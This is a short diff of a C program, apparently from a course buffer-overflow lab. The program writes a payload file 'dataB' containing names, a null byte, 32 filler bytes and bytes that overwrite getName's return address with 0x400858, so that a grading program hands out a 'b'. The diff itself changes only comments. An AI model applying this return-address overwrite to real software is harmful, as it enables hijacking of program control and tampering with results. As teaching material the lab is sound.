@@ -17,15 +17,15 @@ to write 56 bytes to a file called dataB and returns 0.
 int main() {
     FILE *psFile;
     psFile = fopen("dataB", "w");
-    /* 15 bytes */
+    /* 15 bytes (authors' names) */
     fprintf(psFile, "Ishaan and Jack");
-    /* Writes 00000000 = 1 byte*/
+    /* Writes 00000000 = 1 byte. null byte*/
     fprintf(psFile, "%c", '\0'); 
     /* 32 filler bytes */
     fprintf(psFile, "12345678123456781234567812345678");
 
 
-    /* We want to replace getName's return address
+    /* Replace getName's return address
      with 0x400858 (address to grade = 'b' instructions 
      in text section)*/
     fprintf(psFile, "%c", 0x58);
